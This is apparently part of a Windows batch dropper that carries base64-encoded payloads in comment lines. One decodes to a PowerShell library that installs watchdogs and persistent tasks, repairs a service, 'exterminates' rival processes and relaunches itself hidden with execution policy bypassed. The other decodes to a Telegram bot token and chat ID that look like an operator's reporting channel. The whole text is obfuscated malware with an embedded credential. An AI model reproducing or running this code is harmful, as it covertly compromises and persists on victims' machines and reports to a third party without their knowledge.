::dGludWUpIC1vcg0KICAgICAgICAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAoSm9p
::bi1QYXRoICRXb3JrRGlyICdncnl4YV9ib290LmNtZCcpKSkgew0KICAgICAgICAk
::dGFza3NPaysrDQogICAgfQ0KICAgIGlmICgtbm90ICRNb25QYXRoKSB7ICRNb25Q
::YXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdvd25fbW9uLmNtZCcgfQ0KICAgICR3
::ZCA9IEVuc3VyZS1XYXRjaGRvZw0KICAgICRwcmV2ID0gQHt9DQogICAgJHN0YXRl
::UGF0aCA9IEpvaW4tUGF0aCAkV29ya0RpciAnc3RhdGUuanNvbicNCiAgICBpZiAo
::VGVzdC1QYXRoICRzdGF0ZVBhdGgpIHsNCiAgICAgICAgdHJ5IHsgKEdldC1Db250
::ZW50IC1MaXRlcmFsUGF0aCAkc3RhdGVQYXRoIC1SYXcgfCBDb252ZXJ0RnJvbS1K
::c29uKS5QU09iamVjdC5Qcm9wZXJ0aWVzIHwgRm9yRWFjaC1PYmplY3QgeyAkcHJl
::dlskXy5OYW1lXSA9ICRfLlZhbHVlIH0gfSBjYXRjaCB7fQ0KICAgIH0NCiAgICAk
::aW5zdGFsbENvdW50ID0gMQ0KICAgIGlmICgkcHJldi5pbnN0YWxsQ291bnQpIHsg
::JGluc3RhbGxDb3VudCA9IFtpbnRdJHByZXYuaW5zdGFsbENvdW50IH0NCiAgICBp
::ZiAoJHByZXYucHJpbSAtYW5kICRwcmV2LnByaW0gLW5lICdSdW5uaW5nJyAtYW5k
::ICRwcmltIC1lcSAnUnVubmluZycpIHsgJGluc3RhbGxDb3VudCsrIH0NCiAgICAk
::c3RhdGUgPSBbb3JkZXJlZF1Aew0KICAgICAgICBob3N0ICAgICAgICAgPSAkZW52
::OkNPTVBVVEVSTkFNRQ0KICAgICAgICB0cyAgICAgICAgICAgPSAoR2V0LURhdGUp
::LlRvVW5pdmVyc2FsVGltZSgpLlRvU3RyaW5nKCdvJykNCiAgICAgICAgYnVpbGQg
::ICAgICAgID0gJEJ1aWxkDQogICAgICAgIHByaW0gICAgICAgICA9ICQoaWYgKCRw
::cmltKSB7ICRwcmltIH0gZWxzZSB7ICdNSVNTSU5HJyB9KQ0KICAgICAgICBhbHQg
::ICAgICAgICAgPSAkKGlmICgkYWx0KSB7ICRhbHQgfSBlbHNlIHsgJ01JU1NJTkcn
::IH0pDQogICAgICAgIGdyeXhhICAgICAgICA9ICQoaWYgKCRzY3JpcHQ6Z3J5eGEp
::IHsgJHNjcmlwdDpncnl4YSB9IGVsc2UgeyAnTUlTU0lORycgfSkNCiAgICAgICAg
::Z3J5eGFGcCAgICAgID0gJGdyeXhhRnANCiAgICAgICAgZm9yZWlnbiAgICAgID0g
::JGZvcmVpZ24NCiAgICAgICAgdGFza3NPayAgICAgID0gJHRhc2tzT2sNCiAgICAg
::ICAgdGFza3NUb3RhbCAgID0gJHRhc2tzVG90YWwNCiAgICAgICAgd2F0Y2hkb2cg
::ICAgID0gJHdkDQogICAgICAgIGluc3RhbGxDb3VudCA9ICRpbnN0YWxsQ291bnQN
::CiAgICAgICAgbGFzdEhlYWwgICAgID0gJChpZiAoJEV4dHJhKSB7IChHZXQtRGF0
::ZSkuVG9Vbml2ZXJzYWxUaW1lKCkuVG9TdHJpbmcoJ28nKSB9IGVsc2VpZiAoJHBy
::ZXYubGFzdEhlYWwpIHsgJHByZXYubGFzdEhlYWwgfSBlbHNlIHsgJG51bGwgfSkN
::CiAgICAgICAgbm90ZSAgICAgICAgID0gJEV4dHJhDQogICAgfQ0KICAgICgkc3Rh
::dGUgfCBDb252ZXJ0VG8tSnNvbiAtQ29tcHJlc3MpIHwgU2V0LUNvbnRlbnQgLUxp
::dGVyYWxQYXRoICRzdGF0ZVBhdGggLUZvcmNlDQogICAgcmV0dXJuICRzdGF0ZQ0K
::fQ0KDQpzd2l0Y2ggKCRBY3Rpb24pIHsNCiAgICAnaW5pdCcgICAgICAgICAgICB7
::ICRpZCA9IEluaXRpYWxpemUtSWRlbnRpdHk7ICRpZC5HZXRFbnVtZXJhdG9yKCkg
::fCBGb3JFYWNoLU9iamVjdCB7ICIkKCRfLktleSk9JCgkXy5WYWx1ZSkiIH0gfQ0K
::ICAgICdpZGVudGl0eScgICAgICAgIHsgJGlkID0gUmVhZC1JZGVudGl0eTsgJGlk
::LkdldEVudW1lcmF0b3IoKSB8IEZvckVhY2gtT2JqZWN0IHsgIiQoJF8uS2V5KT0k
::KCRfLlZhbHVlKSIgfSB9DQogICAgJ3dhdGNoZG9nJyAgICAgICAgeyBJbnN0YWxs
::LVdhdGNoZG9nIHwgT3V0LU51bGwgfQ0KICAgICd3YXRjaGRvZy1lbnN1cmUnIHsg
::RW5zdXJlLVdhdGNoZG9nIH0NCiAgICAndGFza3MtZW5zdXJlJyAgICB7IEVuc3Vy
::ZS1QZXJzaXN0VGFza3MgfQ0KICAgICdzdGF0ZScgICAgICAgICAgIHsgVXBkYXRl
::LVN0YXRlIHwgQ29udmVydFRvLUpzb24gLUNvbXByZXNzIH0NCiAgICAncmVwYWly
::JyAgICAgICAgICB7IFJlcGFpci1TQ1NlcnZpY2UgJEZwIH0NCiAgICAncmVnaXN0
::ZXJlZCcgICAgICB7IFRlc3QtU0NSZWdpc3RlcmVkICRGcCB9DQogICAgJ2V4dGVy
::bWluYXRlJyAgICAgeyBJbnZva2UtRXh0ZXJtaW5hdGUgfQ0KICAgICdncnl4YS1o
::ZWFsdGgnICAgIHsgVGVzdC1Hcnl4YUhlYWx0aCB9DQogICAgJ3N5bmMtZ3J5eGEt
::ZnAnICAgew0KICAgICAgICAkZyA9IEZpbmQtUnVubmluZ0dyeXhhRnANCiAgICAg
::ICAgaWYgKCRnKSB7DQogICAgICAgICAgICBTZXQtR3J5eGFGcCAkZw0KICAgICAg
::ICAgICAgV3JpdGUtT3V0cHV0ICJTWU5DRUR8JGciDQogICAgICAgIH0gZWxzZSB7
::DQogICAgICAgICAgICAkY3VyID0gR2V0LUdyeXhhRnANCiAgICAgICAgICAgIGlm
::ICgtbm90IChUZXN0LUlzR3J5eGFGcCAkY3VyKSAtYW5kICRzY3JpcHQ6R3J5eGFF
::eHBlY3RlZEZwKSB7DQogICAgICAgICAgICAgICAgU2V0LUdyeXhhRnAgJHNjcmlw
::dDpHcnl4YUV4cGVjdGVkRnANCiAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQg
::IlJFU0VUfCQoJHNjcmlwdDpHcnl4YUV4cGVjdGVkRnApIg0KICAgICAgICAgICAg
::fSBlbHNlIHsNCiAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQgIk5PTkV8JGN1
::ciINCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICAndGVzdC1t
::c2knICAgICAgICB7DQogICAgICAgICRwYXRoID0gJEV4dHJhDQogICAgICAgIGlm
::ICgtbm90ICRwYXRoKSB7IFdyaXRlLU91dHB1dCAnbm8nOyBicmVhayB9DQogICAg
::ICAgIGlmIChUZXN0LU1zaVBhY2thZ2UgJHBhdGggJEZwKSB7IFdyaXRlLU91dHB1
::dCAneWVzJyB9IGVsc2UgeyBXcml0ZS1PdXRwdXQgJ25vJyB9DQogICAgfQ0KICAg
::ICdwcm90ZWN0LW1zaScgICAgIHsNCiAgICAgICAgJHNhZmUgPSBQcm90ZWN0LU1z
::aVNpYmxpbmdTYWZlICRFeHRyYQ0KICAgICAgICBpZiAoJHNhZmUpIHsgV3JpdGUt
::T3V0cHV0ICRzYWZlIH0gZWxzZSB7IFdyaXRlLU91dHB1dCAnRkFJTCcgfQ0KICAg
::IH0NCiAgICAndmVyaWZ5LXVwZGF0ZScgICB7DQogICAgICAgICMgRXh0cmEgPSAi
::bWFuaWZlc3R8c2lnfG5hbWU9cGF0aDtuYW1lMj1wYXRoMiINCiAgICAgICAgJHBh
::cnRzID0gJEV4dHJhIC1zcGxpdCAnXHwnLCAzDQogICAgICAgIGlmICgkcGFydHMu
::Q291bnQgLWx0IDMpIHsgV3JpdGUtT3V0cHV0ICdiYWQtYXJncyc7IGJyZWFrIH0N
::CiAgICAgICAgJG1hcCA9IEB7fQ0KICAgICAgICBmb3JlYWNoICgkcGFpciBpbiAo
::JHBhcnRzWzJdIC1zcGxpdCAnOycpKSB7DQogICAgICAgICAgICBpZiAoJHBhaXIg
::LW1hdGNoICdeKFtePV0rKT0oLiopJCcpIHsgJG1hcFskbWF0Y2hlc1sxXV0gPSAk
::bWF0Y2hlc1syXSB9DQogICAgICAgIH0NCiAgICAgICAgV3JpdGUtT3V0cHV0IChU
::ZXN0LVVwZGF0ZU1hbmlmZXN0ICRwYXJ0c1swXSAkcGFydHNbMV0gJG1hcCkNCiAg
::ICB9DQogICAgJ3N5bmMtc2V2cnotZnAnICAgew0KICAgICAgICBpZiAoJEV4dHJh
::KSB7IFdyaXRlLU91dHB1dCAoU3luYy1TZXZyekV4cGVjdGVkICRFeHRyYSkgfQ0K
::ICAgICAgICBlbHNlIHsNCiAgICAgICAgICAgICRrID0gQChHZXQtU2V2cnpLZWVw
::KQ0KICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICgiU0VWUlp8JCgka1swXSl8JCgk
::a1sxXSkiKQ0KICAgICAgICB9DQogICAgfQ0KICAgICdncnl4YS1lbnN1cmUnICAg
::IHsNCiAgICAgICAgaWYgKCROb1dhaXQpIHsNCiAgICAgICAgICAgICMgTDM1L0wz
::OTogcGFzcyBBcmd1bWVudExpc3QgYXMgc3RyaW5nIGFycmF5IChqb2luZWQgc3Ry
::aW5nIGlzIGEgU3RhcnQtUHJvY2VzcyBmb290Z3VuKQ0KICAgICAgICAgICAgJHBz
::ID0gKEdldC1Qcm9jZXNzIC1JZCAkUElEKS5QYXRoDQogICAgICAgICAgICBpZiAo
::LW5vdCAkcHMpIHsgJHBzID0gJ3Bvd2Vyc2hlbGwuZXhlJyB9DQogICAgICAgICAg
::ICAkYXJnTGlzdCA9IEAoDQogICAgICAgICAgICAgICAgJy1Ob1Byb2ZpbGUnLCAn
::LUV4ZWN1dGlvblBvbGljeScsICdCeXBhc3MnLA0KICAgICAgICAgICAgICAgICct
::RmlsZScsICRQU0NvbW1hbmRQYXRoLA0KICAgICAgICAgICAgICAgICctQWN0aW9u
::JywgJ2dyeXhhLWVuc3VyZScsDQogICAgICAgICAgICAgICAgJy1Xb3JrRGlyJywg
::JFdvcmtEaXIsDQogICAgICAgICAgICAgICAgJy1CdWlsZCcsICRCdWlsZA0KICAg
::ICAgICAgICAgKQ0KICAgICAgICAgICAgaWYgKCREZWVwKSAgeyAkYXJnTGlzdCAr
::PSAnLURlZXAnIH0NCiAgICAgICAgICAgIGlmICgkRm9yY2UpIHsgJGFyZ0xpc3Qg
::Kz0gJy1Gb3JjZScgfQ0KICAgICAgICAgICAgU3RhcnQtUHJvY2VzcyAtRmlsZVBh
::dGggJHBzIC1Bcmd1bWVudExpc3QgJGFyZ0xpc3QgLVdpbmRvd1N0eWxlIEhpZGRl
::bg0KICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICdRVUVVRUR8ZGV0YWNoZWQ9MScN
::CiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAoSW52
::b2tlLUdyeXhhRW5zdXJlIHwgT3V0LVN0cmluZykuVHJpbSgpDQogICAgICAgIH0N
::CiAgICB9DQp9DQo=
::B64_LIB_END

::B64_NTF_BEGIN
Qk9UX1RPS0VOPTg2MTk3MTU3NTQ6QUFGTWsyTmpORC1oUWsyeFBGWWppY0hmQjVNeUt0Y1hDcWcK
Q0hBVF9JRD03NTQ3NDYyMDcwCg==
::B64_NTF_END
